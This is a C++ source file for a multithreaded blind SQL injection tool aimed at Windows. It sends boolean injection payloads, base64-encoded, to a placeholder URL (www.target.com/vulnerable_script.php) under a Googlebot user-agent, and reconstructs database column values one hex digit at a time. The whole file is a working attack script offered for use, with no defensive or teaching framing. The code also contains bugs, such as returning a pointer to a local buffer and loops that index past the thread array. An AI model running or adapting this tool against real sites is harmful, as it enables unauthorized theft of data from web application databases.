#define WIN32_LEAN_AND_MEAN  

#include "base64.h"
#include "socket.h"
#include <iostream>
#include <tchar.h>
#include <signal.h>
#include <windows.h>
#include <winsock2.h>

#define TRUESTMT "A true response goes here"
#define THREADS 100

using namespace std;

struct threadParams 
{
       int tid;
       int limit;
       int offset;
       int maxlen;
};

// uninitialized
int    hexDigest[8];
char   resultArray[9000];
HANDLE activeThreads[1024];

int   percent         = 0;
int   totalRequests   = 0;
int   finishedThreads = 0;

char* strQuery      = "' or CHAR(%i)=(select substring(hex(concat(column_one,0x3a,column_two)),%i,1) from database.table where column_three = 825);#";
char* strCheckQuery = "' or CHAR(%i)>(select substring(hex(concat(column_one,0x3a,column_two)),%i,1) from database.table where column_three = 825);#";

char* _get( const char* queryStr );
void  to_ascii( char* dest, char *text );
DWORD WINAPI myThread( LPVOID lpParameter );
bool  WINAPI ConsoleHandler( DWORD dwCtrlType );

///////////////////////////////////////////
///////////////////////////////////////////
///////////////////////////////////////////
// Main
//
//

int main( int argc, char* argv[] ) 
{
    
  if (SetConsoleCtrlHandler( (PHANDLER_ROUTINE)ConsoleHandler,TRUE)==FALSE)
  {
      printf("Unable to install handler!\n");
      return -1;
  }

  if (argc < 3)
  {
      printf("Usage: %s <length> <limit>\r\n", argv[0]);
      exit(0);
  }
  
  // initialize resultArray to blank spaces
  // a null byte (0x00) will null the whole result
  memset(&resultArray, ' ', 9000);
  
  DWORD  exitCode;
  
  int  totThreads = 0;
  int    threadID = 0;
  int    maxLen   = atoi(argv[1]) * 2;
  int    limit    = atoi(argv[2]);
  bool   running  = true;
  char*  caption  = (char*)malloc(256);
  char*  result   = (char*)malloc(256);
  HANDLE hThread  = NULL;
  
  if (maxLen % 2 == 0) maxLen += 1;
  resultArray[maxLen+1] = '\0';
  
  sprintf(caption, "Fetching %i", limit);
  SetConsoleTitle(caption);
  
  if (maxLen <= THREADS)
      totThreads = maxLen;
  else
      totThreads = THREADS;
  
  for (threadID = 0; threadID < maxLen; threadID++)
  {
      running                 = true;
      threadParams* tParams   = new threadParams;
      tParams->tid            = threadID;
      tParams->offset         = threadID;
      tParams->limit          = limit;
      tParams->maxlen         = maxLen;
      activeThreads[threadID] = CreateThread(0, 0, myThread, tParams, 0, 0);
      
      // DO NOT CREATE MORE THAN THE MAXIMUM THREAD COUNT
      if (threadID % totThreads == 0)
      {
          for (int t = 0; t < sizeof(activeThreads); ++t)
          {
              while (GetExitCodeThread(activeThreads[t], &exitCode))
              {
                  if (exitCode != STILL_ACTIVE)
                      break;
              }
          }
          running = false;         
      }
  }
  
  while (running)
  {
        running = false;
        for (int t = 0; t < sizeof(activeThreads); ++t)
        {
           GetExitCodeThread(activeThreads[t], &exitCode);
           if (exitCode == STILL_ACTIVE)
              running = true;
        }
  }
  
  //system("cls");
  to_ascii( result, resultArray ); 
  printf("\r\n\r\nTotal Requests: %i\r\nResult:\r\n%s", totalRequests, result);
   
  return 0;
}

///////////////////////////////////////////
///////////////////////////////////////////
///////////////////////////////////////////
// Custom function bodies
//
//

DWORD WINAPI myThread(LPVOID lpParameter)
{
    int   myHexDigest[5]  = {48, 49, 50, 51, 52}; // at very least, 5 chars
    char* myQuery         = (char*)malloc(1024);
    char* cpt             = (char*)malloc(256);
    threadParams* tParams = (threadParams*)lpParameter;
        
    // boundary checking
    sprintf(myQuery, strCheckQuery, 55, tParams->offset, tParams->limit);
    std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(myQuery), strlen(myQuery));
    if (strstr(_get(encoded.c_str()), TRUESTMT))
    {
        // 48 - 54
        sprintf(myQuery, strCheckQuery, 51, tParams->offset, tParams->limit);
        std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(myQuery), strlen(myQuery));
        if (strstr(_get(encoded.c_str()), TRUESTMT))
        {
            // 48 - 50
            myHexDigest[0] = 48;
            myHexDigest[1] = 49;
            myHexDigest[2] = 50;
        }
        else
        {
            // 51 - 54
            myHexDigest[0] = 51;
            myHexDigest[1] = 52;
            myHexDigest[2] = 53;
            myHexDigest[3] = 54;
        }
    }
    else
    {
        // 55 - 70
        sprintf(myQuery, strCheckQuery, 66, tParams->offset, tParams->limit);
        std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(myQuery), strlen(myQuery));
        if (strstr(_get(encoded.c_str()), TRUESTMT))
        {
            // 55 - 65
            myHexDigest[0] = 55;
            myHexDigest[1] = 56;
            myHexDigest[2] = 57;
            myHexDigest[3] = 65;
        }
        else
        {
            // 66 - 70
            myHexDigest[0] = 66;
            myHexDigest[1] = 67;
            myHexDigest[2] = 68;
            myHexDigest[3] = 69;
            myHexDigest[4] = 70;
        }
    }
	
    for (char chr = 0, szHD = sizeof(myHexDigest); chr <= szHD; ++chr)
	{
          // Check if the task completed.
          if (percent >= 100 && tParams->offset != 1) 
          {
              resultArray[tParams->offset - 1] = 0;
              exit(0);
          }
          sprintf(myQuery, strQuery, myHexDigest[chr], tParams->offset, tParams->limit);
          std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(myQuery), strlen(myQuery));
          if (strstr(_get( encoded.c_str() ), TRUESTMT))
          {
              resultArray[tParams->offset - 1] = (char)myHexDigest[chr];
              break;
          }
    }
    
    finishedThreads++;
    percent = ((finishedThreads*100)/(tParams->maxlen));
    sprintf(cpt, "Fetching @ offset %i,1 - %i%%", tParams->limit, percent);
    SetConsoleTitle(cpt);
    //printf("%s\r", resultArray);
}

bool WINAPI ConsoleHandler(DWORD CEvent)
{
    char mesg[128];
    DWORD dwExitCode;

    switch(CEvent)
    {
    case CTRL_C_EVENT:
         for (int t = 0; t < sizeof(activeThreads); ++t)
         {
             TerminateThread(activeThreads[t], dwExitCode);
         }
         printf("Result: %s", resultArray);
         exit(0);
        break;
    case CTRL_BREAK_EVENT:
        MessageBox(NULL,
            _T("CTRL+BREAK received!"),_T("CEvent"),MB_OK);
        break;
    case CTRL_CLOSE_EVENT:
        MessageBox(NULL,
            _T("Program being closed!"),_T("CEvent"),MB_OK);
        break;
    case CTRL_LOGOFF_EVENT:
        MessageBox(NULL,
            _T("User is logging off!"),_T("CEvent"),MB_OK);
        break;
    case CTRL_SHUTDOWN_EVENT:
        MessageBox(NULL,
            _T("User is logging off!"),_T("CEvent"),MB_OK);
        break;

    }
    return TRUE;
}

char* _get( const char* queryStr )
{
      char  ret[1024];
      char* url = (char*)malloc(1024);
      
      memset(&ret, 0, 1024);
      sprintf(url, "GET http://www.target.com/vulnerable_script.php?getvar=%s HTTP/1.1", queryStr);    
      try 
      {
        SocketClient s("www.target.com", 80);
    
        s.SendLine(url);
        s.SendLine("Host: www.target.com");
        s.SendLine("User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
        s.SendLine("");
        
        totalRequests++;
    
        while (1) 
        {
          string l = s.ReceiveLine();
          if (l.empty()) break;
          strcat(ret, l.c_str());
        }
    
      } 
      catch (const char* s)
      {
        cerr << s << endl;
      } 
      catch (std::string s) {
        cerr << s << endl;
      } 
      return ret;
}

void to_ascii( char* dest, char *text )
{
    unsigned int ch ;
    for( ; sscanf( (const char*)text, "%2x", &ch ) == 1 ; text += 2 )
          *dest++ = ch ;
    *dest = 0 ; // null-terminate
}
